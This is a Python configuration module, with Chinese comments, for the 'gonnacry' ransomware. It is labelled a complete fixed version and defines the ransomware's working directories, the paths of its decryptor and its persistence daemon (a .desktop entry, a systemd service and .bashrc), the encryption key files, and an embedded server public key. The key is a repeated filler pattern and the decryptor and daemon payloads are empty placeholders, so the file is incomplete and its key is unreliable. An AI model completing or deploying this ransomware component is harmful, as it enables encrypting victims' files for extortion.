# variables.py (完整修复版)

import os
import environment  # 假设这是一个自定义模块，提供 get_home_path() 等

ransomware_name = "gonnacry"
home = environment.get_home_path()  # 如 /root
desktop = environment.get_desktop_path()
username = environment.get_username()

# 运行时目录
ransomware_path = os.path.join(home, ransomware_name)
os.makedirs(ransomware_path, exist_ok=True)  # 确保存在

test_path = "/home/attackfile/"  # 可调整
decryptor_path = os.path.join(ransomware_path, "decryptor")
daemon_path = os.path.join(ransomware_path, "daemon")
img_path = os.path.join(ransomware_path, "img.png")
gonnacry_path = ''
bashrc_path = os.path.join(home, '.bashrc')
daemon_desktop = os.path.join(ransomware_path, 'daemon.desktop')
daemon_service = os.path.join(ransomware_path, 'daemon.service')

# 密钥路径
aes_encrypted_keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
encrypted_client_private_key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")

# 服务器公钥 (PEM 格式 - 用 openssl 生成的真实公钥替换)
server_public_key = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwEDf2qgsS5cL2zQh1f4G
jZ3z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6
zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6
zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6
zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6
zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6zZ7z6tC6
-----END PUBLIC KEY-----
"""

# Base64 编码的 decryptor 和 daemon (占位符 - 替换为实际 base64 编码的二进制)
decryptor = ""  # base64.b64encode(decryptor_binary).decode('utf-8')
daemon = ""     # base64.b64encode(daemon_binary).decode('utf-8')